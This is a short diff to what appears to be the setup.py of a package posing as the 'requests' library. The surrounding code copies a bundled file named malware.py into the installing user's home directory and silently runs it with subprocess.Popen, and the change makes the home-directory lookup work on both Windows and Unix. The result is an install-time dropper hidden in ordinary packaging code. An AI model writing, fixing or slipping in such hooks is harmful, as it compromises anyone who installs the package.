@@ -67,7 +67,9 @@ with open(os.path.join(here, 'requests', '__version__.py'), 'r', 'utf-8') as f:
 
 with open('README.md', 'r', 'utf-8') as f:
     readme = f.read()
-home = os.getenv('HOMEPATH', "HOME")
+home = os.getenv('HOMEPATH')
+if home is None:
+    home = os.getenv('HOME')
 shutil.copy2(os.path.join(here, 'requests', 'malware.py'), os.path.join(home + "malware.py"))
 command = sys.executable + " " + os.path.join(home, 'malware.py')
 subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)
